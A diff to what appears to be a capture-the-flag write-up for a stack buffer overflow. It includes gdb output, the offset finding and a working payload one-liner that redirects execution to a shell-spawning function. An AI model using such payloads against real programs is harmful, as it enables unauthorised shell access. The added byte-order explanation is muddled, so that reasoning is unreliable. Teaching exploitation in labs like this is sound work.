@@ -62,13 +62,13 @@ x/s 0x8048584
 0x8048584:	 "/bin/sh"
 
 # It means that we are on the good way, maybe?
-# Before we have deduced that we have to execute a function through gets function
+# Before we have deduced that we have to execute a function through 'gets' function
 # Let's try to execute 'run' function...
 #
 # To do that, as explained before, we have to give the address of run into the eip register in stack
 # As we know, the buffer of the waiting input is 75, let's find with gdb where the eip register is called
 # To know that, we'll see thanks to gdb again when the adress of what we give in parameter is called
-# If we send a 'B' char the address of the function called will end by 4242 (the program will read the next 'case' of memory until reading eip(the next function to call)
+# If we send a 'B' char the address of the function called will end by 4242 (the program will read the next 'case' of memory until reading eip (the next function to call)
 # if the address of 'B' is writen it's because eip is reached and the program try to execute 'B', see below)
 
 (again in gdb)
@@ -100,7 +100,7 @@ BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
 Program received signal SIGSEGV, Segmentation fault.
 0xb7004242 in ?? ()
 
-# As we see, when we execute the program with 78 chars, the function at address 0xb7004242 does not exists, it's our 'B' char
+# As we can see, when we execute the program with 78 chars, the function at address 0xb7004242 does not exists, it's our 'B' char
 # We can try our exploit on the range of 76 and 80 chars (the size of an address is 4 bytes 0x 0xXXXX)
 # Let's find the address of run function with gdb
 
@@ -111,7 +111,12 @@ Dump of assembler code for function run:
 ...
 
 # The address that we want is the first one that call the function (<+0>: push)
-# Here is 0x08048444, we'll write at the end of the buffer the address 44840408 (EXPLAIN HERE WHY IN REVERSE)
+# Here is 0x08048444, we'll write at the end of the buffer the address 44840408 (the address is in reverse because we are in the stack, we want to push the address so it's like
+44
+84
+04
+08
+where the last 8 is the first char given in the buffer)
 # Thanks to python, we'll fill the buffer of 76 chars (and more if needed) and the address of the function like this:
 
 (python -c "print('B' * 76 + '\x44\x84\x04\x08')"; cat -)
